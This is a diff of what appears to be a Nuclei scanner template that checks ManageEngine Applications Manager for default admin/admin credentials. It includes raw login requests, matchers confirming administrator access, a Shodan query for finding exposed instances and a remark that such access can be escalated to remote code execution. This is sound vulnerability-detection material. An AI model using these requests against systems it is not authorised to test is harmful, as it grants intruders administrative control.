@@ -1,60 +1,64 @@
-http:
-- raw:
-  - 'GET /index.do HTTP/1.1
-
-    Host: {{Hostname}}
-
-    '
-- raw:
-  - 'POST /j_security_check HTTP/1.1
-
-    Host: {{Hostname}}
-
-    Origin: {{RootURL}}
-
-    Content-Type: application/x-www-form-urlencoded
-
-    Referer: {{RootURL}}/index.do
-
-
-    clienttype=html&webstart=&j_username=admin&ScreenWidth=1280&ScreenHeight=709&username={{username}}&j_password={{password}}
-
-    '
-- matchers:
-  - condition: and
-    part: body
-    type: word
-    words:
-    - Super Administrator
-    - Add Application
-  matchers-condition: and
-  raw:
-  - 'GET /showresource.do?group=All&method=showResourceTypes&monitor_viewtype=categoryview
-    HTTP/1.1
-
-    Host: {{Hostname}}
-
-    Referer: {{RootURL}}/j_security_check
-
-    '
 id: app-manager-default-login
-info:
-  author: 0midC13
-  description: 'Default credentials grants administrative access to ManageEngine Applications
-    Manager, which can be later escalated into a RCE via DB queries.
 
-    '
+info:
+  name: ManageEngine Applications Manager - Default Credentials
+  author: 0midC13
+  severity: high
+  description: |
+    Default credentials grants administrative access to ManageEngine Applications Manager, which can be later escalated into a RCE via DB queries.
+  reference:
+    - https://www.manageengine.com/products/applications_manager/
   metadata:
-    max-request: 1
-    runzero-match: any(each(service["html.titles"]), {# matches "Applications Manager
-      Login Screen"})
     shodan-query: title:"Applications Manager Login Screen"
     verified: true
-  name: ManageEngine Applications Manager - Default Credentials
-  reference:
-  - https://www.manageengine.com/products/applications_manager/
-  severity: high
-  tags: default-login,manageengine,vuln,zoho
+    max-request: 3
+  tags: default-login,manageengine,zoho,vuln
+
 variables:
-  password: admin
-  username: admin
+  username: "admin"
+  password: "admin"
+
+http:
+  - raw:
+      - |
+        GET /index.do HTTP/1.1
+        Host: {{Hostname}}
+
+  - raw:
+      - |
+        POST /j_security_check HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{RootURL}}/index.do
+
+        clienttype=html&webstart=&j_username=admin&ScreenWidth=1280&ScreenHeight=709&username={{username}}&j_password={{password}}
+
+  - raw:
+      - |
+        GET /showresource.do?group=All&method=showResourceTypes&monitor_viewtype=categoryview HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{RootURL}}/j_security_check
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "Super Administrator"
+          - "Add Application"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "j_username"
+          - "j_password"
+          - "clienttype=html"
+        condition: or
+        negative: true
+# digest: 4b0a00483046022100aae678531e4d89bf0f59789e2e6cd8e2b65bba7979fec88a5c0fc5162ba05fe3022100a87a37ff4ad76dae2f87c566cf110c59d747b90dfb15ecb8c792f2b1e1e23ec7:922c64590222798bb761d5b6d8e72950
